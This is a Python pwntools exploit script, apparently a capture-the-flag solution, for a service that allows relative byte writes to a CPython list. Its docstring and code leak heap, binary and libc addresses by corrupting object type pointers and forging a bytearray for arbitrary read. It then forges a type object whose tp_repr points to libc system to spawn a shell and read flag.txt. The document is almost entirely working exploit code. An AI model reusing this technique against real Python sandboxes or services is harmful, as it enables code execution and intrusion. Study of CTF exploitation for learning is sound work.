import os, ast
from pwn import process, remote, p64, u64, log, gdb, context

"""
To get a leak, we will change one of the list entry's type such that the
tp_repr fields are NULL so that the object's address will be printed.
To do this reliably, we want to achieve this by only changing one (lowest) byte
of a given Py type in the list.
The dict element is a good target for this - checking the tp_repr
field in the following shows 0x0:
gef> p *(PyTypeObject*)((unsigned long)&PyDict_Type & ~0xff)

We use the distance from a to &*a->ob_item[0] (the elements itself is "behind" a):
gef> p/x -((unsigned long)&*a->ob_item[0] - (unsigned long)a)
0x67d00

Distance from a to a->ob_item:
gef> p/x -((unsigned long)a->ob_item - (unsigned long)a)
0x39a40

For some reason these offsets are sometimes off by a bit, but it turns out
writing to the first offset is non-fatal so we just try both candidates in succession.

Now that we have a leak in a rw area, we can use this to create fakeobjs and
prepare a better arb rw. There are probably a lot of ways to get a better read
primitive but here is a simple one.
The PyDict_Type has a tp_dict field which is mapped in the same region as a.
With the leak of a, we can get the address of this dict. So let's just set one
of the elements to this value and print it - it will contain methods whose repr
gives us their address leaking the binary base!
gef> p/x (unsigned long)PyDict_Type->tp_dict - (unsigned long)a
0xefdc0

Next we must leak libc. Since we have the python binary base we can just read
the GOT entries. The PyByteArrayObject seems to have a pointer as a backing
store and will read from it and display it like bytearray('blah'). This work
perfectly for an arbitrary read and gives us the libc leak.

For RIP control, we can just craft a fake type object and set tp_repr then
trigger a print. To get a shell, we can overwrite tp_repr with libc system and
put "/bin/sh" in the refcnt field of our fake object
(which will be interpreted as a char*, the first arg to system).
"""

context.log_level = 'debug'
context.arch = 'amd64'
context.word_size = 64
if os.getenv('RUNNING_IN_DOCKER'):
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h', '-p', '75']
else:
    gdb.binary = lambda: 'gef'
    context.terminal = ['alacritty', '-e', 'zsh', '-c']


# DIST_FROM_a offsets may depend on the exact python environment!
# debug the python process running inside nsjail to get the correct offsets
DIST_FROM_a_TO_ob_item0 = -0x67d00
DIST_FROM_a_TO_ob_item = -0x39a40
DIST_FROM_a_to_PyDict_Type_tp_dict = 0xefdc0
SCRATCH_FAKE_PyObject_OFFSET = 0x40000 # probably safe to write to
SCRATCH_FAKE_PyTypeObject_OFFSET = 0x48000 # probably safe to write to

PyByteArray_Type_OFFSET = 0x578d60
GOTPLT_nice_OFFSET = 0x56a338
LIBC_SYSTEM_OFFSET = 0x50d70

def read(idx):
    conn.sendlineafter(b'> ', f'r {idx}'.encode())

def write(offset, val):
    assert 0 <= val <= 0xff
    conn.sendlineafter(b'> ', f'w {offset} {val}'.encode())

def write_abs(addr, val):
    assert addr_of_a, 'missing addr_of_a leak'
    assert addr > 0x10000000, 'addr should be absolute'

    offset = addr - addr_of_a
    for i, b in enumerate(val):
        write(offset + i, b)

is_arb_read_setup = False
def arb_read(addr, size):
    assert addr_of_a, 'missing addr_of_a leak'
    assert python_base, 'missing python_base leak'
    global is_arb_read_setup

    if not is_arb_read_setup:
        # write the fake PyTypeObject to our target list entry's ob_type
        write_abs(addr_of_a + DIST_FROM_a_TO_ob_item, p64(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET))
        fakeobj_hdr = bytearray(32)
        fakeobj_hdr[0:8] = p64(0x1337) # ob_refcnt
        fakeobj_hdr[8:16] = p64(python_base + PyByteArray_Type_OFFSET) # ob_type
        fakeobj_hdr[24:32] = p64(0x1337) # ob_alloc
        write_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET, fakeobj_hdr)
        is_arb_read_setup = True

    write_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET + 16, p64(size)) # ob_size
    write_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET + 32, p64(addr)) # ob_bytes
    write_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET + 40, p64(addr)) # ob_start
    read(0)
    leak = conn.recvline().decode()
    return ast.literal_eval(leak.split('(')[1].split(')')[0])

# conn = process(['python3', '../publish/rw.py'])
conn = remote('0.0.0.0', 1337)

# overwrite the dict element's type to get a leak
write(DIST_FROM_a_TO_ob_item0 + 8, 0x00)
read(0)
if conn.recvline().decode().strip() == '{}':
    # adjust some offsets if that failed
    DIST_FROM_a_TO_ob_item0 += 0x200
    DIST_FROM_a_TO_ob_item += 0x1c0
    DIST_FROM_a_to_PyDict_Type_tp_dict -= 0x3e40
    write(DIST_FROM_a_TO_ob_item0 + 8, 0x00)
    read(0)
conn.recvuntil(b'object at ')
leak = int(conn.recvline().decode().strip('>\n'), 16)

addr_of_a = leak - DIST_FROM_a_TO_ob_item0

log.info(f'leak = {hex(leak)}')
log.success(f'addr_of_a = {hex(addr_of_a)}')

# set a->ob_item[0] to PyDict_Type->tp_dict to leak a binary address
write_abs(addr_of_a + DIST_FROM_a_TO_ob_item, p64(addr_of_a + DIST_FROM_a_to_PyDict_Type_tp_dict))
read(0)
bin_leak = conn.recvline().decode()
bin_leak = int(bin_leak.split('object at ')[1].split('>,')[0], 16)
python_base = bin_leak - 0x57c5c0
log.info(f'bin_leak = {hex(bin_leak)}')
log.success(f'python_base = {hex(python_base)}')

# craft a fake PyByteArrayObject to get an arb read and leak a libc address
addr_to_read = python_base + GOTPLT_nice_OFFSET
nice_leak = u64(arb_read(addr_to_read, 8))
libc_base = nice_leak - 0x11a7b0
log.info(f'nice_leak = {hex(nice_leak)}')
log.success(f'libc_base = {hex(libc_base)}')

# craft a fake PyTypeObject with tp_repr set to libc.system
write_abs(addr_of_a + SCRATCH_FAKE_PyTypeObject_OFFSET + 88, p64(libc_base + LIBC_SYSTEM_OFFSET)) # tp_repr is at offset 88
# set the ob_refcnt field to ".bin/sh" the '.' turns into '/' after refcnt inc
write_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET, b'.bin/sh\x00')
# craft the fake PyObject with ob_type set to the fake PyTypeObject
write_abs(addr_of_a + SCRATCH_FAKE_PyObject_OFFSET + 8, p64(addr_of_a + SCRATCH_FAKE_PyTypeObject_OFFSET))

# shell
read(0)

conn.sendline(b'cat flag.txt')

conn.interactive()
